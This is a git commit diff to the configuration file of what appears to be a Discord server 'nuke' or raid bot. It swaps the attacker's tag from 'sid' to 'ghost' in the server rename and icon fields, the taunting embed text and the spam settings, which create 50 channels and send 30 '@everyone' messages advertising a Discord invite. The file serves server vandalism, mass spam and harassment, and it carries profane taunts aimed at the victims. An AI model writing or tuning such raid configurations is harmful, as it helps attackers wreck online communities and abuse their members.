9a4c35de80a1a720512d8fd6cb610310b32d79b7
Sidharth <128839129+BAHUBALISID@users.noreply.github.com>
2024-08-19 16:16:45 +0530

    Update config.py

--- config.py
+++ config.py
@@ -1,20 +1,20 @@
 SERVER_CONFIG = {
-    "new_name": "nuked by sid",  # New Server Name here      
-    "new_icon": "sid here babe nextra here mfs you get fucked",   # New Server Icon url here → https://yourimage.jpg    
-    "new_description": "nuked by kol sid cry hard",  # New Server Description here    
+    "new_name": "nuked by ghost",  # New Server Name here      
+    "new_icon": "ghost here babe nextra here mfs you get fucked",   # New Server Icon url here → https://yourimage.jpg    
+    "new_description": "nuked by ghost cry hard",  # New Server Description here    
 }
 
 WEBHOOK_CONFIG = {
-    "default_name": "YOUR SID",  # Webhook Name here     
+    "default_name": "YOUR GHOST",  # Webhook Name here     
 }
 
 
 AUTO_RAID_CONFIG = {
     'num_channels': 50,  # Number of channels/ better max 50    
     'channel_type': 'text',  # text/voice     
-    'channel_name': 'NUKED BY SID',  # Channel name      
+    'channel_name': 'NUKED BY GHOST',  # Channel name      
     'num_messages': 30,  # Number of message to spam/better max 30     
-    'message_content': '@everyone JOIN  https://discord.gg/fUaEn4THHr'# Spam Message     
+    'message_content': '@everyone JOIN  https://discord.gg/HKDRZzDufR'# Spam Message     
 }
 
 NO_BAN_KICK_ID = {
@@ -37,6 +37,6 @@ EMBED_CONFIG = {
         {"name": "KolSidOwned", "value": "SidOwned", "inline": False},
         {"name": "SidOwned", "value": "SidOwned", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False      
     ],
-    "image": "   sid owned you motherfuckers",   # Embed Icon url here → https://yourimage.com     
+    "image": "   Ghost owned you motherfuckers",   # Embed Icon url here → https://yourimage.com     
     "footer": "SidOwned",  # Embed Footer here/ just a text     
 }
